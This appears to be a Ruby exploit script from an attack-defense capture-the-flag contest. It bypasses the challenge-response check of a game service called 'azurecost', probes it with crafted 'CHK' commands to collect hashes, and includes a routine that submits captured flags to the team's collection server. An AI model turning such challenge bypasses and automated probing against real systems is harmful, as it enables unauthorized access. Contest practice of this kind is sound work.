#!/usr/bin/env ruby
require 'socket'
require 'timeout'
require 'yaml'
require 'hexdump'

#########################################
#
#   сервис: azurecost
#    порты: 1393
# алгоритм:
#
#########################################

TARGET_PORT = 1393

OUR_HOST = '10.12.21.8'
FLAG_RE  = /^[a-f0-9]{16}$/i

# координаты нашей постилки флагов
POST_FLAGS_HOST = "10.12.21.21"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

@host  = 'localhost'
@ids   = {}
@flags = []

#raise "don't attack self!" if @host == OUR_HOST

class UnicodeSocket < TCPSocket
  def puts string
    write(string.split('').map{ |c|
      if c == "\n"
        "#{c}\x01\x00\x00"
      else
        "#{c}\x00\x00\x00"
      end
    }.join + "\n\x00\x00\x00")
  end

  def gets
    r = super
    r ? r.tr("\x00","") : r
  end
end

def _submit_flags
  socket = TCPSocket.new POST_FLAGS_HOST, POST_FLAGS_PORT
  socket.puts "id=azure"
  socket.gets
  socket.puts @flags.join("\n")
  socket.flush
  socket.close
  @flags = []
end

def submit_flags
  Timeout.timeout(60){ _submit_flags }
rescue
  puts "[!] #{__method__}: #{$!}"
end

@hash = {}

def attack_host i
  socket = UnicodeSocket.new @host, TARGET_PORT
  chal = socket.read(4).unpack('L')[0]
  #printf " in: %08x %10d\n", chal&0xffffffff, chal

  resp = (chal^0xa7f7e284)**2 + 0xa82d3274

  outdata = [resp].pack('L')
  data = outdata.unpack('L')[0]
  #printf "out: %08x %10d\n", data&0xffffffff, data

  socket.write outdata

  fname = "%017i" % i
  #printf "0x%2x: %2d: ", i, i

  #fname = "fh94ipAdfxrlGnOc1"

  #socket.puts("CHK #{fname}\x20\x03\x03\x03\x0d\x02\x02\x02")
  socket.puts("CHK #{fname} \x02")
  while true do
    s = socket.gets.strip
    if s['HASH:']
      putc '.'
      return s
    end
  end
end

h = Hash.new{ |k,v| k[v] = [] }

0.upto(72) do |i|
  h[attack_host(i)] << i
  break if h.size >= 4
end
puts

p h
